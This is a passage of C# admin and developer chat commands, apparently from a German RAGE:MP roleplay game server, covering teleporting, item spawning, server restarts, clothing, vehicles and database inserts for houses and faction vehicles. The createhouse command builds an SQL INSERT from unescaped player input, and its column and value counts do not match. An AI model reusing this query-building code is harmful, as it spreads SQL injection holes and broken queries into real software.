                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            string x = player.Position.X.ToString().Replace(".", ",");
            string y = player.Position.Y.ToString().Replace(".", ",");
            string z = player.Position.Z.ToString().Replace(".", ",");
            string heading = player.Rotation.Z.ToString().Replace(".", ",");

            if (iPlayer.RageExtension.IsInVehicle)
            {
                x = player.Vehicle.Position.X.ToString().Replace(".", ",");
                y = player.Vehicle.Position.Y.ToString().Replace(".", ",");
                z = player.Vehicle.Position.Z.ToString().Replace(".", ",");
                heading = player.Vehicle.Rotation.Z.ToString().Replace(".", ",");
            }

            Logger.Print($"{x} {y} {z} {heading} {comment}");
            iPlayer.SendNewNotification($"Position gespeichert. {comment}", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 30000);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void addperso(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod()) return;

            if (!Devmode) return;

            iPlayer.Container.AddItem(ItemModelModule.Instance.GetByType(ItemModelTypes.Perso), 1, new Dictionary<string, dynamic> { { "Id", iPlayer.Id }, { "Name", iPlayer.GetName() } });
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void addfunk(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!Devmode) return;

            iPlayer.Container.AddItem(ItemModelModule.Instance.GetByType(ItemModelTypes.Radio), 1, new Dictionary<string, dynamic> { { "Fq", 0.0 }, { "Volume", 5 } });
            VoiceModule.Instance.ChangeFrequenz(iPlayer, 0.0f);

            iPlayer.UpdateApps();
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setfunk(Player player, string frequenz)
        {
            var iPlayer = player.GetPlayer();

            Double.TryParse(frequenz, out double fq);

            if (!Devmode) return;

            VoiceModule.Instance.ChangeFrequenz(iPlayer, fq);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async Task closeServerX(Player player)
        {
            var iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;

            await NAPI.Task.WaitForMainThread(0);

            if (!iPlayer.CanAccessMethod() && !Devmode && iPlayer.RankId != (int)AdminLevelTypes.Founder)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (!Configuration.Instance.IsServerOpen)
            {

                Configuration.Instance.IsServerOpen = true;
                iPlayer.SendNewNotification("Ended Restart!");
                return;
            }

            try
            {
                iPlayer.SendNewNotification("Initialize Server Restart!");

                foreach (DbPlayer dbPlayer in Players.Players.Instance.GetValidPlayers())
                {
                    if (!dbPlayer.IsValid()) continue;
                    if (dbPlayer.Player != null && dbPlayer.Player != player)
                    {
                        dbPlayer.Save();
                        dbPlayer.Player.Kick();
                    }
                }

                Configuration.Instance.IsServerOpen = false;

                iPlayer.SendNewNotification("Bitte 5min warten!");
            }
            catch (Exception ex)
            {
                Logger.Crash(ex);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void rideme(Player player, string name)
        {
            // Rage 1.1 deaktiviert
            /*var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod() && !Devmode && iPlayer.RankId != (int)adminlevel.Projektleitung)
            {
                iPlayer.SendNewNotification(MSG.Error.NoPermissions());
                return;
            }

            try
            {
                var dbPlayer = Players.Players.Instance.FindPlayer(name, true);

                if (dbPlayer == null) return;

                dbPlayer.Player.AttachTo(iPlayer.Player, "SKEL_Spine1",
                    new Vector3(-0.2f, 0, 0.2f), new Vector3(0, 0, -90));

                dbPlayer.PlayAnimation(AnimationScenarioType.Animation,
                    "missswitch", "base_passenger", -1, true,
                    AnimationLevels.User,
                    (int)(AnimationFlags.Loop |
                           AnimationFlags.AllowPlayerControl), true);
            }
            catch (Exception ex)
            {
                Logger.Crash(ex);
            }*/
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void unattach(Player player, string name)
        {
            // Rage 1.1 deaktiviert
            /*var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod() && !Devmode && iPlayer.RankId != (int)adminlevel.Projektleitung)
            {
                iPlayer.SendNewNotification(MSG.Error.NoPermissions());
                return;
            }

            var dbPlayer = Players.Players.Instance.FindPlayer(name, true);

            if (dbPlayer == null) return;

            dbPlayer.Player.Detach();
            dbPlayer.Player.Position = iPlayer.Player.Position;*/
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void objectspeed(Player player, float speed)
        {
            var iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;


            if (!iPlayer.CanAccessMethod() && !Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            if (iPlayer.AdminObject != null)
            {
                iPlayer.AdminObjectSpeed = speed;
                return;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void dimension(Player player, string dimension)
        {
            if (!uint.TryParse(dimension, out uint dimension_int)) return;
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            iPlayer.SetDimension(dimension_int);
            iPlayer.SendNewNotification($"Dimension {iPlayer.Player.Dimension}");
        }

        [Command]
        public void dimensioninfo(Player player)
        {
            var iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;

            iPlayer.SendNewNotification($"Dimension {iPlayer.Player.Dimension} | Zone : {(ZoneModule.Instance.IsInNorthZone(player.Position) ? "North" : "South")}");
        }

        [Command]
        public void ipinfo(Player player)
        {
            var iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            iPlayer.SendNewNotification($"IP: {player.Address}");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void gethereall(Player player)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;

            if (!Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            foreach (DbPlayer dbPlayer in Players.Players.Instance.GetValidPlayers())
            {
                if (!dbPlayer.IsValid()) continue;
                if (dbPlayer.Player != null)
                {
                    if (dbPlayer.AccountStatus == AccountStatus.LoggedIn)
                    {
                        dbPlayer.Player.SetPosition(player.Position);
                        dbPlayer.SetDimension(player.Dimension);
                        dbPlayer.DimensionType[0] = iPlayer.DimensionType[0];
                    }
                }
            }
        }


        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void vehmod(Player player, int type, int mod)
        {
            var iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            NAPI.Task.Run(() =>
            {
                NAPI.Vehicle.SetVehicleMod(player.Vehicle.Handle, type, mod);
            });
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testlivery(Player player, int livery)
        {
            var iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            player.Vehicle.Livery = livery;
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testanim(Player player, string commandParams)
        {
            DbPlayer iPlayer = player.GetPlayer();
            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Length <= 0) return;

            if (!int.TryParse(args[0], out int flag)) return;

            player.SendNotification($"{flag} {args[1]} {args[2]}");

            iPlayer.PlayAnimation(flag, args[1], args[2]);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testevent(Player player, string commandParams)
        {
            if (!Devmode)
            {
                return;
            }

            var args = commandParams.Split(" ");

            if (!int.TryParse(args[0], out int flag)) return;
            if (args.Length <= 2) return;

            player.SendNotification($"{flag} {args[1]} {args[2]}");

            NAPI.Player.PlayPlayerAnimation(player, flag, args[1], args[2]);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testscene(Player player, string p1)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            iPlayer.PlayAnimation(AnimationScenarioType.Scenario, p1, "", 10);
            iPlayer.SendNewNotification("scene " + p1 + " ausgefuehrt!");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testtrain(Player player, string iplname)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod() || !Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            NAPI.Vehicle.CreateVehicle(0x33C9E158, iPlayer.Player.Position, iPlayer.Player.Heading, 1, 1);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void getzone(Player player, string iplname)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            Module.Zone.Zone zone = ZoneModule.Instance.GetZone(iPlayer.Player.Position);
            iPlayer.SendNewNotification($"Zone: {zone.Name} - {zone.Id}");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void loadipl(Player player, string iplname)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            NAPI.World.RequestIpl(iplname);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void removeipl(Player player, string iplname)
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            NAPI.World.RemoveIpl(iplname);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void createhouse(Player player, string commandParams = " ")
        {
            var iPlayer = player.GetPlayer();


            if (!iPlayer.CanAccessMethod() && !Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            var command = commandParams.Split(new[] { ' ' }, 3, StringSplitOptions.RemoveEmptyEntries).Select(p => p.Trim()).ToArray();
            if (command.Length <= 2) return;

            string x = player.Position.X.ToString().Replace(",", ".");
            string y = player.Position.Y.ToString().Replace(",", ".");
            string z = player.Position.Z.ToString().Replace(",", ".");
            string heading = player.Rotation.Z.ToString().Replace(",", ".");

            string query = String.Format(
                "INSERT INTO `houses` (`type`,`price`, `interiorid`, `owner`, `posX`, `posY`, `posZ`, `colshapeX`, `colshapeY`, `colshapeZ`, `heading`, `maxrents`, `inv_cash`, `belastet`, `container_id`, `ownerID`, `keller`, `garage`, `trash_amount`, `moneykeller`, `bl_amount`, `dimension_null_house`, `show_phonenumber`) VALUES ('{0}', '{1}', '0', '', '{2}', '{3}', '{4}', '{5}', '{6}', '0', '0', '0', '0', '0', '0', '0', '0', '0', '0', '');",
                command[0], command[1], x, y, z, x, y, z, heading, command[2]);

            MySQLHandler.ExecuteAsync(query);

            Console.Write(iPlayer.GetName() + " hat ein Haus erstellt Price:" + command[1] + " Type:" + command[0] + " Rents:" +
                          command[2] + " Pos:" + x + " " + y + " " + z + " " + heading);
            iPlayer.SendNewNotification("Haus erstellt Price:" + command[1] + " Type:" + command[0] +
                                    " Rents:" + command[2] +
                                    " Pos:" + x + " " + y + " " + z + " " + heading, title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void createfvehicles(Player player)
        {
            var iPlayer = player.GetPlayer();

            if (!iPlayer.CanAccessMethod() && !Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            var teams = TeamModule.Instance.GetAll().Values.Where(t => t.IsGangsters());
            foreach (Team team in teams)
            {
                var garage = GarageModule.Instance.GetAll().Values.FirstOrDefault(g => g.Teams.Contains(team.Id) && g.Teams.Count() == 1 && g.Classifications.Contains(1) && g.Npc != PedHash.Autoshop02SMM);
                if (garage == null)
                {
                    Logger.Print("Invalid garage " + team.Name);
                    continue;
                }

                /*
                for (int i = 0; i < 3; i++)
                {
                    var vehicleData = VehicleDataModule.Instance.GetDataById(978);
                    string query = String.Format(
                                            "INSERT INTO `fvehicles` (`vehiclehash`, `team`, `color1`, `color2`, `inGarage`, `model`, `fuel`, `plate`, `lastGarage`) VALUES ('{0}', '{1}', '{2}', '{3}', '1', '{4}', '100', '{5}', '{6}');",
                                            vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model, team.Id, team.ColorId, team.ColorId,
                                            vehicleData.Id, team.ShortName, garage.Id);
                    MySQLHandler.Execute(query);

                    Logger.Print($"{team.Name} - {i} | {(vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model)}");
                }

                for (int i = 0; i < 4; i++)
                {
                    var vehicleData = VehicleDataModule.Instance.GetDataById(78);
                    string query = String.Format(
                                            "INSERT INTO `fvehicles` (`vehiclehash`, `team`, `color1`, `color2`, `inGarage`, `model`, `fuel`, `plate`, `lastGarage`) VALUES ('{0}', '{1}', '{2}', '{3}', '1', '{4}', '100', '{5}', '{6}');",
                                            vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model, team.Id, team.ColorId, team.ColorId,
                                            vehicleData.Id, team.ShortName, garage.Id);
                    MySQLHandler.Execute(query);

                    Logger.Print($"{team.Name} - {i} | {(vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model)}");
                }

                for (int i = 0; i < 1; i++)
                {
                    var vehicleData = VehicleDataModule.Instance.GetDataById(529);
                    string query = String.Format(
                                            "INSERT INTO `fvehicles` (`vehiclehash`, `team`, `color1`, `color2`, `inGarage`, `model`, `fuel`, `plate`, `lastGarage`) VALUES ('{0}', '{1}', '{2}', '{3}', '1', '{4}', '100', '{5}', '{6}');",
                                            vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model, team.Id, team.ColorId, team.ColorId,
                                            vehicleData.Id, team.ShortName, garage.Id);
                    MySQLHandler.Execute(query);

                    Logger.Print($"{team.Name} - {i} | {(vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model)}");
                }*/
                for (int i = 0; i < 5; i++)
                {
                    var vehicleData = VehicleDataModule.Instance.GetDataById(631);
                    string query = String.Format(
                                            "INSERT INTO `fvehicles` (`vehiclehash`, `team`, `color1`, `color2`, `inGarage`, `model`, `fuel`, `plate`, `lastGarage`) VALUES ('{0}', '{1}', '{2}', '{3}', '1', '{4}', '100', '{5}', '{6}');",
                                            vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model, team.Id, team.ColorId, team.ColorId,
                                            vehicleData.Id, team.ShortName, garage.Id);
                    MySQLHandler.Execute(query);

                    Logger.Print($"{team.Name} - {i} | {(vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model)}");
                }

                for (int i = 0; i < 1; i++)
                {
                    var vehicleData = VehicleDataModule.Instance.GetDataById(632);
                    string query = String.Format(
                                            "INSERT INTO `fvehicles` (`vehiclehash`, `team`, `color1`, `color2`, `inGarage`, `model`, `fuel`, `plate`, `lastGarage`) VALUES ('{0}', '{1}', '{2}', '{3}', '1', '{4}', '100', '{5}', '{6}');",
                                            vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model, team.Id, team.ColorId, team.ColorId,
                                            vehicleData.Id, team.ShortName, garage.Id);
                    MySQLHandler.Execute(query);

                    Logger.Print($"{team.Name} - {i} | {(vehicleData.IsModdedCar == 1 ? vehicleData.mod_car_name : vehicleData.Model)}");
                }
                iPlayer.SendNewNotification($"Fraktionsfahrzeuge für {team.Name} erstellt.", title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void count(Player player)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;

            if (!Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            iPlayer.SendNewNotification("Count: " + Players.Players.Instance.GetValidPlayers().Count);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command(GreedyArg = true)]
        public void testextra(Player player, int extra, int enabled)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;

            if (!iPlayer.RageExtension.IsInVehicle) return;

            if (!Devmode)
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }

            bool xb = false;
            if (enabled == 1) xb = true;
            player.Vehicle.SetExtra(extra, xb);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void prop(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Length <= 2) return;

            if (!int.TryParse(args[0], out int slot)) return;
            if (!int.TryParse(args[1], out int drawable)) return;
            if (!int.TryParse(args[2], out int texture)) return;

            NAPI.Player.SetPlayerAccessory(player, slot, drawable, texture);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void cloth(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Length < 4) return;

            if (!int.TryParse(args[1], out int slot)) return;
            if (!int.TryParse(args[2], out int drawable)) return;
            if (!int.TryParse(args[3], out int texture)) return;

            DbPlayer foundPlayer = Players.Players.Instance.FindPlayer(args[0]);
            if (foundPlayer == null || !foundPlayer.IsValid()) return;

            foundPlayer.SetClothes(slot, drawable, texture);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void setcloth(Player player, string commandParams)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.IsValid()) return;
            if (!dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Length < 2) return;

            if (!uint.TryParse(args[1], out uint id)) return;
            if (!ClothModule.Instance.Contains(id)) return;

            Cloth cloth = ClothModule.Instance[id];
            DbPlayer foundPlayer = Players.Players.Instance.FindPlayer(args[0]);
            if (foundPlayer == null || !foundPlayer.IsValid()) return;

            foundPlayer.SetClothes(cloth.Slot, cloth.Variation, cloth.Texture);

            if (foundPlayer.Character.Clothes.ContainsKey(cloth.Slot))
            {
                foundPlayer.Character.Clothes[cloth.Slot] = cloth.Id;
            }
            else
            {
                foundPlayer.Character.Clothes.Add(cloth.Slot, cloth.Id);
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void serien(Player player, string nr)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (iPlayer.RageExtension.IsInVehicle)
            {
                uint id = 0;

                if (nr == "")
                {
                    id = (uint)new Random().Next(300000, 600000);
                }
                else
                {
                    id = uint.TryParse(nr, out uint result) ? result : 0;
                }

                var sxVehicle = player.Vehicle.GetVehicle();
                if (sxVehicle == null)
                {
                    player.Vehicle.SetData("vehicle", new SxVehicle() { databaseId = id });
                }
                else
                {
                    sxVehicle.databaseId = id;
                }
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void alpha(Player player, string alpha)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            if (iPlayer.RageExtension.IsInVehicle)
            {
                player.Vehicle.Transparency = int.TryParse(alpha, out int result) ? result : 255;

                SxVehicle sxVehicle = player.Vehicle.GetVehicle();
                if (sxVehicle != null && sxVehicle.IsValid())
                {
                    foreach (DbPlayer xPlayer in sxVehicle.GetOccupants().GetLegacyDictionary().Values)
                    {
                        if (xPlayer != null && xPlayer.IsValid() && xPlayer.RageExtension.IsInVehicle && xPlayer.Player.Vehicle == player.Vehicle)
                        {
                            xPlayer.Player.Transparency = int.TryParse(alpha, out int result2) ? result2 : 255;
                        }
                    }
                }

            }
            else
            {
                player.Transparency = int.TryParse(alpha, out int result2) ? result2 : 255;
            }
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void color(Player player, string arguments)
        {
            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var args = arguments.Split(" ");
            if (args.Count() != 2) return;

            if (!int.TryParse(args[0], out int color1)) return;
            if (!int.TryParse(args[1], out int color2)) return;

            if (iPlayer.RageExtension.IsInVehicle)
            {
                player.Vehicle.PrimaryColor = color1;
                player.Vehicle.SecondaryColor = color2;
            }
        }
        GTANetworkAPI.Object obj;
        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void createobj(Player player, string commandArgs)
        {

            var iPlayer = player.GetPlayer();

            if (iPlayer == null || !iPlayer.IsValid()) return;
            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            var args = commandArgs.Split(" ");
            if (args.Length != 3) return;
            if (!float.TryParse(args[0], out float x)) return;
            if (!float.TryParse(args[1], out float y)) return;
            if (!float.TryParse(args[2], out float z)) return;
            if (obj != null)
            {
                obj.Delete();
                Console.WriteLine("Deleting old Obj");
            }
            //obj = NAPI.Object.CreateObject(3358237751, new Vector3(2727.282, -371.9337, -47.10417), new Vector3(x, y, z), 255, iPlayer.Player.Dimension);
            obj = NAPI.Object.CreateObject(3358237751, iPlayer.Player.Position, new Vector3(x, y, z), 255, iPlayer.Player.Dimension);

            Console.WriteLine("Created new Obj");
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void clearinv(Player player)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.IsValid()) return;
            if (!dbPlayer.CanAccessMethod())
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            for (int i = 0; i < dbPlayer.Container.MaxSlots; i++)
            {
                Item item = dbPlayer.Container.GetItemOnSlot(i);
                dbPlayer.Container.RemoveItem(item.Model, item.Amount);
            }

            dbPlayer.SendNewNotification("Inventar gelöscht");
        }

        [Command]
        public void casinoadmin(Player player)
        {
            var dbPlayer = player.GetPlayer();

            if (dbPlayer == null || !dbPlayer.IsValid()) return;
            if (!dbPlayer.Rank.CanAccessFeature("casino"))
            {
                dbPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            player.SetPosition(new Vector3(1085.23, 214.348, -49.2004));
            player.SetRotation(314.38f);
        }


        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void testsound(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;
            if (!Devmode)
            {
                return;
            }

            var args = commandParams.Split(" ");
            if (args.Count() != 2) return;


            iPlayer.Player.TriggerNewClient("startsoundplay", args[0], args[1]);

        }

        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void testmusicevent(Player player, string args)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;
            if (!Devmode)
            {
                return;
            }


            iPlayer.Player.TriggerNewClient("startmusicevent", args);

        }

        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void starteffect(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;
            if (!Devmode)
            {
                return;
            }

            iPlayer.Player.TriggerNewClient("startScreenEffect", commandParams, 5000, true);

        }

        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void stopeffect(Player player, string commandParams)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.IsValid()) return;
            if (!Devmode)
            {
                return;
            }

            iPlayer.Player.TriggerNewClient("stopScreenEffect", commandParams);

        }

        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void drunktest(Player player)
        {
            if (!Devmode) return;

            DrunkModule.Instance.SetPlayerDrunk(player.GetPlayer(), true);
        }

        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void drunkofftest(Player player)
        {
            if (!Devmode) return;

            DrunkModule.Instance.SetPlayerDrunk(player.GetPlayer(), false);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public void teamveh(Player player, string input)
        {
            var iPlayer = player.GetPlayer();
            if (!iPlayer.CanAccessMethod())
            {

                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions());
                return;
            }
            var args = input.Split(" ");
            if (!int.TryParse(args[0], out int teamid)) return;
            if (!int.TryParse(args[1], out int range)) return;

            SxVehicle sxVehicle = VehicleHandler.Instance.GetClosestVehicleFromTeamFilter(iPlayer.Player.Position, teamid, range);
            iPlayer.SendNewNotification("Erkenne " + sxVehicle.databaseId);
        }
        [CommandPermission(PlayerRankPermission = false)]
        [Command]
        public void pbspawn(Player player, string commandParams)
        {
            //PBA ID + Active(1/0)
            var iPlayer = player.GetPlayer();
            var args = commandParams.Split(" ");
            if (!int.TryParse(args[0], out int pba_id)) return;
            if (!int.TryParse(args[1], out int active)) return;

            if (!iPlayer.CanAccessMethod())
            {
                iPlayer.SendNewNotification(GlobalMessages.Error.NoPermissions(), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN);
                return;
            }

            string x = player.Position.X.ToString().Replace(",", ".");
            string y = player.Position.Y.ToString().Replace(",", ".");
            string z = player.Position.Z.ToString().Replace(",", ".");
            string heading = player.Rotation.Z.ToString().Replace(",", ".");

            if (iPlayer.RageExtension.IsInVehicle)
            {
                x = player.Vehicle.Position.X.ToString().Replace(",", ".");
                y = player.Vehicle.Position.Y.ToString().Replace(",", ".");
                z = player.Vehicle.Position.Z.ToString().Replace(",", ".");
                heading = player.Vehicle.Rotation.Z.ToString().Replace(",", ".");
            }


            MySQLHandler.ExecuteAsync(
                $"INSERT INTO paintball_spawns (x, y, z, paintball_id,active) VALUES('{MySqlHelper.EscapeString(x)}', '{MySqlHelper.EscapeString(y)}', '{MySqlHelper.EscapeString(z)}', '{pba_id}','{active}')");
            iPlayer.SendNewNotification(string.Format($"Position (x: {x} | y: {y} | z: {z}) saved PaintballID: {pba_id}"), title: "ADMIN", notificationType: PlayerNotification.NotificationType.ADMIN, duration: 30000);
        }

        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async Task fiveminuteupdate(Player player)
        {
            DbPlayer dbPlayer = player.GetPlayer();
            if (dbPlayer == null || dbPlayer.IsValid() == false)
                return;

            if (!Configuration.Instance.DevMode)
                return;

            if (dbPlayer.RankId != (uint)AdminLevelTypes.Founder)
                return;

            var modules = Modules.Instance.GetModules();

            foreach (var module in modules.Values)
            {
                dbPlayer.SendNewNotification($"Triggering OnFiveMinuteUpdate of {module.ToString()}", NotificationType.ADMIN, "DEBUG", 1500);
                await Task.Delay(100);
                module.OnFiveMinuteUpdate();
                dbPlayer.SendNewNotification("OnFiveMinuteUpdate - Done!", NotificationType.ADMIN, "DEBUG", 1500);
                await Task.Delay(600);
            }
        }

        /// <summary>
        /// Mit diesem Command kann die aktuelle MS-Zeit für den Mainthread abgerufen werden
        /// </summary>
        /// <param name="player"></param>
        [CommandPermission(PlayerRankPermission = true)]
        [Command]
        public async Task benchmark(Player player)
        {
            DbPlayer dbPlayer = player.GetPlayer();
            if (dbPlayer == null || !dbPlayer.IsValid())
                return;

            Stopwatch lStopwatch = new Stopwatch();
            lStopwatch.Start();

            await NAPI.Task.WaitForMainThread();
            lStopwatch.Stop();
            await Task.Delay(5);

            long elapsedMs = lStopwatch.ElapsedMilliseconds;
            int vehiclesCount = VehicleHandler.SxVehicles.Count;
            int playerCount = Players.Players.Instance.players.Count;

